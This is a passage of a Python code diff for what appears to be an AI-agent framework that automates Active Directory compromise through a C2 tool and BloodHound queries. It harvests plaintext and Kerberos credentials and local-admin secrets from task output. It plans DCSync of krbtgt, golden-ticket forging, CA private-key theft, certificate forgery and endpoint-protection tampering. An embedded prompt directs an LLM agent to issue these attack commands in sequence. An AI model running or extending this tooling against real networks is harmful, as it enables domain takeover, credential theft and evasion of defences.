+            secret = match.group(1).strip().strip("'\"")
+            if not secret or len(secret) < 4:
+                continue
+            return [{
+                "account": local_account,
+                "realm": realm,
+                "credential": secret,
+                "secret_type": "managed-local-admin-secret",
+                "credential_type": "plaintext",
+            }]
+        return []
+
+    async def _select_account_credential(self, domain: str, account: str) -> dict:
+        domain_cf = self._capability_text(domain).casefold()
+        account_cf = self._canonical_credential_account(account)
+        if not domain_cf or not account_cf:
+            return {}
+        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
+        candidates = []
+        for cred in creds or []:
+            row_account = self._canonical_credential_account(cred.get("account"))
+            realm = self._capability_text(cred.get("realm")).casefold()
+            secret = self._capability_text(cred.get("credential_text")).strip()
+            if row_account != account_cf or realm != domain_cf or not secret:
+                continue
+            key_type = self._account_credential_key_type(cred, secret)
+            if key_type not in {"aes256", "aes128", "rc4"}:
+                continue
+            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
+            candidates.append((priority, {
+                "id": cred.get("id"),
+                "credential": secret,
+                "key_type": key_type,
+            }))
+        if not candidates:
+            recovered = await self._recover_account_credential_from_recorded_task(domain_cf, account_cf)
+            return recovered if recovered else {}
+        candidates.sort(key=lambda item: item[0])
+        return candidates[0][1]
+
+    async def _recover_account_credential_from_recorded_task(self, domain: str, account: str) -> dict:
+        domain_cf = self._capability_text(domain).casefold()
+        account_cf = self._canonical_credential_account(account)
+        if not domain_cf or not account_cf:
+            return {}
+        target_effect = f"creds:{account_cf}@{domain_cf}"
+        certificate_effect = f"certificate-auth:{account_cf}@{domain_cf}"
+        task_ids: list[int] = []
+        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
+            status = self._capability_text(getattr(hop, "status", "")).casefold()
+            if status != "achieved":
+                continue
+            effects = [self._capability_text(getattr(hop, "effect", ""))]
+            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
+            canonical_effects = {
+                self._canonical_capability_effect(item)
+                for item in effects
+                if self._capability_text(item)
+            }
+            if target_effect not in canonical_effects and certificate_effect not in canonical_effects:
+                continue
+            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
+            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
+            try:
+                task_ids.append(int(task_id))
+            except Exception:
+                continue
+        for task_id in task_ids:
+            output = await self._fetch_plain_task_output(task_id)
+            material = self._extract_credential_material(output, account=account_cf, realm=domain_cf)
+            if not material:
+                continue
+            await self._import_credential_material(material, source_task_id=task_id)
+            candidate = self._best_credential_material_candidate(material)
+            if candidate:
+                return candidate
+        return {}
+
+    async def _select_managed_local_admin_credential(self, target_host: str, target_domain: str, local_account: str) -> dict:
+        host_cf = self._capability_host_short(target_host)
+        domain_cf = self._capability_text(target_domain).casefold()
+        account_cf = self._capability_text(local_account or "Administrator").casefold()
+        if not host_cf or not account_cf:
+            return {}
+        host_fqdn = self._capability_host_name(host_cf, domain_cf).casefold()
+        realm_matches = {host_cf, host_fqdn}
+        if domain_cf:
+            realm_matches.add(domain_cf)
+        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
+        candidates = []
+        for cred in creds or []:
+            raw_account = self._capability_text(cred.get("account"))
+            row_account = raw_account.casefold()
+            realm = self._capability_text(cred.get("realm")).casefold()
+            secret = self._capability_text(cred.get("credential_text")).strip()
+            if not secret:
+                continue
+            label = " ".join([
+                self._capability_text(cred.get("type")),
+                self._capability_text(cred.get("comment")),
+                self._capability_text(cred.get("secret_type")),
+                self._capability_text(cred.get("credential_type")),
+            ]).casefold()
+            if any(token in label for token in ("ticket", "hash", "aes", "rc4", "ntlm")):
+                continue
+            embedded_realm = ""
+            embedded_account = row_account
+            if "\\" in row_account:
+                embedded_realm, embedded_account = row_account.split("\\", 1)
+            elif "@" in row_account:
+                embedded_account, embedded_realm = row_account.split("@", 1)
+            if embedded_account != account_cf:
+                continue
+            host_in_comment = host_cf and host_cf in label
+            realm_match = realm in realm_matches or embedded_realm in realm_matches
+            if not realm_match and not host_in_comment:
+                continue
+            priority = 0 if realm in {host_cf, host_fqdn} or embedded_realm in {host_cf, host_fqdn} else 1
+            if "laps" in label or "local admin" in label or "managed" in label:
+                priority -= 1
+            candidates.append((priority, {
+                "id": cred.get("id"),
+                "account": raw_account or local_account or "Administrator",
+                "realm": realm or embedded_realm,
+                "credential": secret,
+            }))
+        if not candidates:
+            recovered = await self._recover_managed_local_admin_credential_from_recorded_task(
+                host_cf,
+                domain_cf,
+                account_cf,
+            )
+            if recovered:
+                return recovered
+            return {}
+        candidates.sort(key=lambda item: item[0])
+        return candidates[0][1]
+
+    async def _recover_managed_local_admin_credential_from_recorded_task(
+        self,
+        target_host: str,
+        target_domain: str,
+        local_account: str,
+    ) -> dict:
+        host_cf = self._capability_host_short(target_host)
+        domain_cf = self._capability_text(target_domain).casefold()
+        account = self._capability_text(local_account or "Administrator") or "Administrator"
+        if not host_cf or not domain_cf:
+            return {}
+        wanted_effect = f"managed-local-admin-secret:{host_cf}@{domain_cf}"
+        task_ids: list[int] = []
+        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
+            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
+                continue
+            effects = [self._capability_text(getattr(hop, "effect", ""))]
+            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
+            if wanted_effect not in {item.casefold() for item in effects if item}:
+                continue
+            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
+            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
+            try:
+                task_ids.append(int(task_id))
+            except Exception:
+                continue
+        for task_id in task_ids:
+            output = await self._fetch_plain_task_output(task_id)
+            material = self._extract_managed_local_admin_credential_material(
+                None,
+                {
+                    "target_host": host_cf,
+                    "target_domain": domain_cf,
+                    "local_account": account,
+                },
+                output,
+            )
+            if not material:
+                continue
+            refs = await self._import_credential_material(material, source_task_id=task_id)
+            if refs:
+                return {
+                    "id": refs[0].get("id"),
+                    "account": account,
+                    "realm": material[0].get("realm") or domain_cf,
+                    "credential": material[0].get("credential"),
+                }
+        return {}
+
+    def _account_credential_key_type(self, cred: dict, secret: str) -> str:
+        label = " ".join([
+            self._capability_text(cred.get("type")),
+            self._capability_text(cred.get("comment")),
+            self._capability_text(cred.get("secret_type")),
+            self._capability_text(cred.get("credential_type")),
+        ]).casefold()
+        if "aes256" in label:
+            return "aes256"
+        if "aes128" in label:
+            return "aes128"
+        if "ntlm" in label or "rc4" in label:
+            return "rc4"
+        return self._infer_capability_key_type(secret)
+
+    async def _resolve_domain_sid(self, domain: str) -> str:
+        domain_cf = self._capability_text(domain).casefold()
+        if not domain_cf:
+            return ""
+        cached = getattr(self, "_domain_sid_cache", {}).get(domain_cf)
+        if cached:
+            return cached
+        cypher_tool = self._bloodhound_cypher_tool()
+        if cypher_tool is None:
+            return ""
+        safe_domain = domain_cf.replace("\\", "").replace("'", "")
+        query = (
+            "MATCH (d:Domain) "
+            f"WHERE toLower(d.name) = '{safe_domain}' "
+            "RETURN DISTINCT d.objectid AS sid"
+        )
+        try:
+            payload = await asyncio.wait_for(
+                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
+                timeout=10,
+            )
+        except Exception:
+            return ""
+        for value in self._mcp_literal_values(payload):
+            sid = self._capability_text(value)
+            if self._is_domain_sid(sid):
+                self._domain_sid_cache[domain_cf] = sid
+                return sid
+        sid = await self._resolve_domain_sid_from_account_object(domain_cf, cypher_tool)
+        if sid:
+            self._domain_sid_cache[domain_cf] = sid
+            return sid
+        return ""
+
+    async def _resolve_domain_sid_from_account_object(self, domain_cf: str, cypher_tool) -> str:
+        safe_domain = self._capability_text(domain_cf).casefold().replace("\\", "").replace("'", "")
+        if not safe_domain or cypher_tool is None:
+            return ""
+        query = (
+            "MATCH (n) "
+            "WHERE (n:User OR n:Computer) AND ("
+            f"toLower(n.domain) = '{safe_domain}' OR "
+            f"toLower(n.name) ENDS WITH '@{safe_domain}') "
+            "AND (toLower(n.name) STARTS WITH 'administrator@' OR "
+            "toLower(n.name) STARTS WITH 'krbtgt@' OR "
+            "toLower(n.name) STARTS WITH 'guest@') "
+            "RETURN DISTINCT n.objectid AS sid ORDER BY sid LIMIT 10"
+        )
+        try:
+            payload = await asyncio.wait_for(
+                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
+                timeout=10,
+            )
+        except Exception:
+            return ""
+        for value in self._mcp_literal_values(payload):
+            sid = self._domain_sid_from_object_sid(value)
+            if sid:
+                return sid
+        return ""
+
+    def _domain_sid_from_object_sid(self, value) -> str:
+        sid = self._capability_text(value)
+        if self._is_domain_sid(sid):
+            return sid
+        if not self._is_sid(sid):
+            return ""
+        parts = sid.split("-")
+        if len(parts) < 8 or parts[:4] != ["S", "1", "5", "21"]:
+            return ""
+        candidate = "-".join(parts[:-1])
+        return candidate if self._is_domain_sid(candidate) else ""
+
+    async def _resolve_domain_controller_host(self, domain: str) -> str:
+        domain_cf = self._capability_text(domain).casefold()
+        if not domain_cf:
+            return ""
+        cached = getattr(self, "_domain_controller_cache", {}).get(domain_cf)
+        if cached:
+            return cached
+        cypher_tool = self._bloodhound_cypher_tool()
+        if cypher_tool is None:
+            return ""
+        safe_domain = domain_cf.replace("\\", "").replace("'", "")
+        query = (
+            "MATCH (c:Computer)-[:MemberOf*1..]->(g:Group) "
+            "WHERE g.objectid ENDS WITH '-516' AND ("
+            f"toLower(c.domain) = '{safe_domain}' OR "
+            f"toLower(g.domain) = '{safe_domain}' OR "
+            f"toLower(c.name) ENDS WITH '.{safe_domain}' OR "
+            f"toLower(g.name) ENDS WITH '@{safe_domain}') "
+            "RETURN DISTINCT c.name AS name ORDER BY name LIMIT 5"
+        )
+        try:
+            payload = await asyncio.wait_for(
+                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
+                timeout=10,
+            )
+        except Exception:
+            return ""
+        for value in self._mcp_literal_values(payload):
+            host = self._capability_host_name(value, domain_cf)
+            if host:
+                if not hasattr(self, "_domain_controller_cache"):
+                    self._domain_controller_cache = {}
+                self._domain_controller_cache[domain_cf] = host
+                return host
+        return ""
+
+    def _bloodhound_cypher_tool(self):
+        try:
+            from ai.mcp import MCPManager
+            for server in MCPManager.get_connected_servers():
+                if "bloodhound" not in server.lower():
+                    continue
+                for tool in MCPManager.get_tools_by_server(server):
+                    if getattr(tool, "name", "") == "cypher_query":
+                        return tool
+        except Exception:
+            return None
+        return None
+
+    def _mcp_literal_values(self, payload) -> list[str]:
+        try:
+            text = payload
+            if isinstance(payload, list) and payload and isinstance(payload[0], dict):
+                text = payload[0].get("text", "")
+            if isinstance(text, dict) and "text" in text:
+                text = text.get("text", "")
+            data = json.loads(text) if isinstance(text, str) else (text or {})
+            literals = (((data or {}).get("data") or {}).get("literals")) or []
+            values: list[str] = []
+            for literal in literals:
+                if not isinstance(literal, dict):
+                    continue
+                value = literal.get("value")
+                if isinstance(value, str) and value.strip():
+                    values.append(value.strip())
+            return values
+        except Exception:
+            return []
+
+    def _capability_command_plan_payload(self, action, execution_plan, command_plan) -> dict:
+        commands = []
+        for command in list(getattr(command_plan, "commands", []) or []):
+            if is_dataclass(command):
+                commands.append(asdict(command))
+            elif isinstance(command, dict):
+                commands.append(dict(command))
+            else:
+                commands.append({
+                    "command": self._capability_text(getattr(command, "command", "")),
+                    "parameters": getattr(command, "parameters", {}),
+                    "capability": self._capability_text(getattr(command, "capability", "")),
+                    "purpose": self._capability_text(getattr(command, "purpose", "")),
+                    "expected_probe": self._capability_text(getattr(command, "expected_probe", "")),
+                    "prerequisites": list(getattr(command, "prerequisites", []) or []),
+                })
+        return {
+            "ok": bool(getattr(command_plan, "ok", False)),
+            "reason": self._capability_text(getattr(command_plan, "reason", "")),
+            "missing": list(getattr(command_plan, "missing", []) or []),
+            "action": asdict(action) if is_dataclass(action) else str(action),
+            "execution_plan": asdict(execution_plan) if is_dataclass(execution_plan) else str(execution_plan),
+            "commands": commands,
+            "issue_instruction": (
+                "Issue commands in order with issue_task_and_waitfor_task_output. For Kerberos context "
+                "capabilities, run the current-context inventory/proof preflight first. If that service proof "
+                "succeeds, stop and record the capability result; do not forge, import, or create another "
+                "logon session. Only proceed to ticket forge/context creation after the current-context proof "
+                "fails. Commands marked deferred consume artifacts produced by prior commands, such as "
+                "kerberos_ticket_base64; do not issue them until the artifact value is bound. For ticket "
+                "capabilities, the service-proof command that consumes kerberos_ticket_imported and "
+                "kerberos_logon_context is the post-import access proof; a normal callback ls/dir outside "
+                "the builder's preflight/proof commands is not equivalent. For execute-as-local-admin, issue "
+                "the remote execution command and verify its output first; if it already contains the target-side "
+                "proof marker, record from that output and stop. Otherwise issue the returned proof-read command "
+                "and verify with the expected_probe before recording achieved state."
+                " For capabilities that return artifact/event/proof metadata, treat the command list as one "
+                "effect transaction: validate structured setup artifacts before waiting, wait for delayed "
+                "environment effects when an event command is present, and do not advance dependent goals until "
+                "a final proof command verifies the required effect or returns a concrete blocker."
+                " For adcs-ca-private-key-export, record achieved only when "
+                "extract_adcs_ca_private_key_probe verifies CA metadata plus valid PFX/private-key material; "
+                "a remote process success, metadata file, or failed export status is not enough."
+                " For adcs-certificate-auth, stage the verified CA PFX on the callback, issue the returned "
+                "certificate forge and PKINIT commands without /ptt, then record achieved only from the "
+                "post-import service-proof command that verifies certificate-auth access in the isolated "
+                "Kerberos context."
+            ) if commands else "",
+        }
+
+    def _default_capability_target(self, name: str, intent: dict, inputs: dict) -> str:
+        capability = self._capability_text(name).casefold()
+        domain = self._capability_text(
+            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or intent.get("source_domain")
+        ).casefold()
+        if capability in {"dcsync-krbtgt", "dcsync-account"} and domain:
+            raw_account = self._capability_text(
+                intent.get("account") or intent.get("user")
+                or inputs.get("account") or inputs.get("user") or inputs.get("target_account")
+                or ("krbtgt" if capability == "dcsync-krbtgt" else "")
+            ).casefold()
+            account = self._canonical_credential_account(raw_account)
+            if account:
+                return f"domain={domain};account={account}"
+        if capability == "forge-golden-ticket" and domain:
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain")
+            ).casefold()
+            return f"domain={domain};target_domain={target_domain}" if target_domain else f"domain={domain}"
+        if capability == "ensure-kerberos-context":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("effect_domain") or inputs.get("domain")
+                or intent.get("target_domain") or intent.get("effect_domain") or intent.get("domain")
+            ).casefold()
+            source_domain = self._capability_text(
+                inputs.get("source_domain") or intent.get("source_domain") or target_domain
+            ).casefold()
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold()
+            if target_domain:
+                target = f"domain={target_domain}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                if source_domain and source_domain != target_domain:
+                    target += f";source_domain={source_domain}"
+                return target
+        if capability == "ensure-account-kerberos-context":
+            domain = self._capability_text(inputs.get("domain") or inputs.get("realm") or intent.get("domain")).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal")
+            ).casefold()
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if domain and account:
+                target = f"domain={domain};account={account}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "read-managed-local-admin-secret":
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal")
+            ).casefold()
+            account_domain = self._capability_text(
+                inputs.get("account_domain") or inputs.get("reader_domain") or inputs.get("principal_domain")
+                or intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
+            ).casefold()
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_host and target_domain:
+                target = f"target={target_host};target_domain={target_domain}"
+                if account:
+                    target = f"account={account};" + target
+                if account_domain:
+                    target = target.replace(f"account={account};", f"account={account};account_domain={account_domain};", 1)
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "use-managed-local-admin-secret":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_host and target_domain:
+                target = f"target={target_host};target_domain={target_domain}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "execute-as-local-admin":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_host and target_domain:
+                target = f"target={target_host};target_domain={target_domain}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "adcs-ca-private-key-export":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_host and target_domain:
+                target = f"target={target_host};target_domain={target_domain}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "adcs-esc-certificate-enroll":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
+            ).casefold()
+            ca_host = self._capability_host_short(inputs.get("ca_host") or inputs.get("target_host") or intent.get("ca_host") or intent.get("target_host"))
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_domain and account:
+                target = f"domain={target_domain};account={account}"
+                if ca_host:
+                    target += f";ca_host={ca_host}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "adcs-certificate-auth":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
+            ).casefold()
+            ca_host = self._capability_host_short(inputs.get("ca_host") or intent.get("ca_host"))
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_domain and account:
+                target = f"domain={target_domain};account={account}"
+                if ca_host:
+                    target += f";ca_host={ca_host}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "endpoint-protection-adjustment":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if target_host and target_domain:
+                target = f"target={target_host};target_domain={target_domain}"
+                if callback_id:
+                    target += f";callback={callback_id}"
+                return target
+        if capability == "grant-directory-rights" and domain:
+            source = self._capability_text(intent.get("execution_context") or inputs.get("execution_context"))
+            return f"domain={domain};source={source}" if source else f"domain={domain}"
+        if capability == "gpo-controlled-system-exec":
+            gpo = self._capability_text(
+                intent.get("gpo")
+                or intent.get("gpo_name")
+                or intent.get("gponame")
+                or intent.get("gpo_display_name")
+                or inputs.get("gpo")
+                or inputs.get("gpo_name")
+                or inputs.get("gponame")
+                or inputs.get("gpo_display_name")
+            )
+            if gpo and domain:
+                return f"gpo={gpo};domain={domain}"
+        return self._capability_text(inputs.get("target"))
+
+    def _default_capability_effects(self, name: str, intent: dict, inputs: dict) -> list[str]:
+        capability = self._capability_text(name).casefold()
+        domain = self._capability_text(
+            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or intent.get("source_domain")
+        ).casefold()
+        if capability in {"dcsync-krbtgt", "dcsync-account"} and domain:
+            raw_account = self._capability_text(
+                intent.get("account") or intent.get("user")
+                or inputs.get("account") or inputs.get("user") or inputs.get("target_account")
+                or ("krbtgt" if capability == "dcsync-krbtgt" else "")
+            ).casefold()
+            account = self._canonical_credential_account(raw_account)
+            if capability == "dcsync-krbtgt" or account == "krbtgt":
+                return [f"krbtgt-hash:{domain}"]
+            if account:
+                return [f"creds:{account}@{domain}"]
+        if capability == "forge-golden-ticket" and domain:
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain")
+            ).casefold()
+            if not target_domain and (inputs.get("extra_sids") or inputs.get("parent_domain_sid")):
+                target_domain = self._parent_domain_for_capability(domain)
+            return [f"da:{target_domain or domain}"]
+        if capability == "ensure-kerberos-context":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("effect_domain") or inputs.get("domain")
+                or intent.get("target_domain") or intent.get("effect_domain") or intent.get("domain")
+            ).casefold()
+            source_domain = self._capability_text(
+                inputs.get("source_domain") or intent.get("source_domain") or target_domain
+            ).casefold()
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold()
+            if target_domain and callback_id:
+                effects = []
+                if source_domain and source_domain != target_domain:
+                    effects.append(f"da:{target_domain}")
+                effects.append(f"kerberos-context:{target_domain}@callback:{callback_id}")
+                return effects
+        if capability == "ensure-account-kerberos-context":
+            domain = self._capability_text(inputs.get("domain") or inputs.get("realm") or intent.get("domain")).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal")
+            ).casefold()
+            callback_id = self._capability_text(
+                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
+            ).casefold().lstrip("#")
+            if domain and account and callback_id:
+                return [f"kerberos-account-context:{account}@{domain}@callback:{callback_id}"]
+        if capability == "read-managed-local-admin-secret":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            if target_host and target_domain:
+                return [f"managed-local-admin-secret:{target_host}@{target_domain}"]
+        if capability == "use-managed-local-admin-secret":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            if target_host and target_domain:
+                return [
+                    f"local-admin:{target_host}@{target_domain}",
+                    f"admin:{target_host}",
+                    f"system-or-admin:{target_host}",
+                ]
+        if capability == "execute-as-local-admin":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            if target_host and target_domain:
+                return [
+                    f"remote-exec:{target_host}@{target_domain}",
+                    f"host-exec:{target_host}",
+                ]
+        if capability == "adcs-ca-private-key-export":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            if target_host and target_domain:
+                return [
+                    f"adcs-ca-private-key:{target_host}@{target_domain}",
+                    f"adcs-ca:{target_host}@{target_domain}",
+                ]
+        if capability == "adcs-esc-certificate-enroll":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
+            ).casefold()
+            if target_domain and account:
+                return [f"adcs-enrolled-certificate:{account}@{target_domain}"]
+        if capability == "adcs-certificate-auth":
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("principal")
+                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
+            ).casefold()
+            if target_domain and account:
+                return [
+                    f"da:{target_domain}",
+                    f"certificate-auth:{account}@{target_domain}",
+                ]
+        if capability == "endpoint-protection-adjustment":
+            target_host = self._capability_host_short(
+                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                or intent.get("target_host") or intent.get("host") or intent.get("computer")
+            )
+            target_domain = self._capability_text(
+                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
+            ).casefold()
+            if not target_domain and target_host:
+                _, target_domain = self._capability_host_domain(
+                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
+                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
+                )
+            if target_host and target_domain:
+                return [f"endpoint-protection-adjusted:{target_host}@{target_domain}"]
+        if capability == "grant-directory-rights" and domain:
+            return [f"ds-replication-rights:{domain}"]
+        if capability == "gpo-controlled-system-exec" and domain:
+            gpo = self._capability_text(
+                intent.get("gpo")
+                or intent.get("gpo_name")
+                or intent.get("gponame")
+                or intent.get("gpo_display_name")
+                or inputs.get("gpo")
+                or inputs.get("gpo_name")
+                or inputs.get("gponame")
+                or inputs.get("gpo_display_name")
+            )
+            if gpo:
+                return [f"system-exec:gpo:{gpo}@{domain}"]
+        return []
+
+    def _capability_domain(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._capability_text(
